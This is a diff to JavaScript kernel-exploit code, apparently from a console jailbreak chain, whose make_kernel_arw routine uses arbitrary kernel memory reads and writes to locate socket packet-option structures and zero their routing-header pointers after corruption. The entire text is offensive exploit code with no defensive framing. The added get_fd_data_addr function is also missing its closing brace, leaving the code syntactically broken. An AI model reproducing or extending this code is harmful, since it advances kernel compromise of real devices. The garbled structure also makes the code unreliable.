@@ -1487,33 +1487,27 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
   var  INPCB_PKTOPTS = 0x118;
 
 
-  function get_fd_data_addr(fd) {
-  const filep = kmem.read64(ofiles.add(fd * SIZEOF_OFILES));
-  return kmem.read64(filep);
-}
 function get_sock_pktopts(fd) {
-  const sock_data = get_fd_data_addr(fd);
-  const pcb = kmem.read64(sock_data.add(SO_PCB));
-  return kmem.read64(pcb.add(INPCB_PKTOPTS));
+    const sock = get_fd_data_addr(fd);          // struct socket *
+    const pcb  = sock.readp(SO_PCB);            // struct inpcb *
+    return pcb.readp(INPCB_PKTOPTS);            // struct ip6_pktopts *
 }
 
+    function get_fd_data_addr(fd) {
+     const idx = new Int(fd * SIZEOF_OFILES, 0);
+    const filep = ofiles.add(idx);      
+    return filep.readp(0);               
     
-    
- 
 for (let sd of [reclaim_sock, worker_sock, ...sds]) {
-  try {
-    const pkto = get_sock_pktopts(sd); // Int / Addr
-    if (!pkto || typeof pkto.lo !== 'number' || typeof pkto.hi !== 'number') {
-      log(`invalid pkto for fd=${sd}: skipping`);
-      continue;
+        try {
+            const pkto = get_sock_pktopts(sd);
+            const ptr  = pkto.add(new Int(off_ip6po_rthdr, 0));
+            kmem.write64(ptr, 0);
+        } catch (e) {
+            log(`skip clean rthdr fd=${sd}: ${e}`);
+        }
     }
 
-    const ptr = pkto.add(off_ip6po_rthdr);
-    kmem.write64(ptr, 0);
-  } catch (e) {
-    log(`skip clean rthdr fd=${sd}: ${e}`);
-  }
-}
     
   
   /* const bump_fds = [
